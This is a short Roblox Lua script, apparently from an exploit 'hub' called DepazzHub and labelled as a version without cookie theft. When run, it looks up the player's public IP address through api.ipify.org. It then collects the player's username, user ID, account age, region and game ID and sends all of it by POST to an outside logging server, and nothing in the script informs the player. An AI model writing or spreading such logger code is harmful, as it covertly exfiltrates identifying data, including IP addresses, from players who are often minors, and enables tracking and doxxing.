-- =====================================================================
-- DEPAZZHUB WEBHOOK - Versión Limpia (Sin Cookies)
-- =====================================================================

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalizationService = game:GetService("LocalizationService")

local player = Players.LocalPlayer
local placeId = game.PlaceId

-- 1. OBTENER IP DEL USUARIO
local userIP = "Desconocida"
pcall(function()
    local res = game:HttpGet("https://api.ipify.org")
    userIP = res
end)

-- 2. RECOPILACIÓN DE DATOS (Sin cookie)
local data = {
    username = player.Name,
    displayName = player.DisplayName,
    userId = player.UserId,
    gameId = placeId,
    accountAge = tostring(player.AccountAge) .. " días",
    region = LocalizationService.RobloxLocaleId,
    ip = userIP
}

-- 3. FUNCIÓN DE ENVÍO UNIVERSAL
local function SendWebhook(url, data)
    local jsonData = HttpService:JSONEncode(data)
    
    -- Intento 1: request()
    if type(request) == "function" then
        local success, res = pcall(request, {
            Url = url, Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = jsonData
        })
        if success then return true, res end
    end
    
    -- Intento 2: http_request()
    if type(http_request) == "function" then
        local success, res = pcall(http_request, {
            Url = url, Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = jsonData
        })
        if success then return true, res end
    end
    
    -- Intento 3: HttpService
    local success, res = pcall(function()
        return HttpService:PostAsync(url, jsonData)
    end)
    
    return success, res
end

-- 4. EJECUCIÓN
local webhookUrl = "https://depazzhub-api.onrender.com/log"

print(" Preparando envío para: " .. player.Name)

local success, response = SendWebhook(webhookUrl, data)

if success then
    print("✅ ¡Webhook enviado correctamente a DepazzHub!")
else
    warn("❌ Error al enviar el webhook:", response)
end
